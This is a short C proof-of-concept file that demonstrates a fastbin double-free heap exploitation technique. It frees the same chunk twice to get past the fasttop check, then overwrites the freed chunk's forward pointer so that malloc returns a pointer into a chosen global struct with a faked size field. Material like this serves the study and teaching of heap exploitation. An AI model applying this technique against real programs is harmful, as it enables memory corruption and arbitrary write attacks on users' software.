//double-free-ptr3.c
#include <stdio.h>
#include <stdlib.h>

struct 
{
    int size;
    int target; //We want malloc to return pointer to this
}target_struct;

void main()
{
    int i;
    void *a, *b;
    
    printf("&target_struct.target=%p\n", &target_struct.target);
    
    a = malloc(16);
    b = malloc(16);
      
    free(a);
    free(b); //bypass fasttop
    free(a); //double free
    
    void *c = malloc(16); // returns a
    
    malloc(16);  // returns b
    
    // Write address of target in fwd pointer
    *(int*)a = (int)&target_struct.target - 8;
    
    // Bypass memory corruption (fast)
    target_struct.size = 24;
    
    malloc(16); // returns a again
    
    printf("Trying to return a pointer to target_struct.target\n");
    printf("malloc(16)=%p\n", malloc(16));
}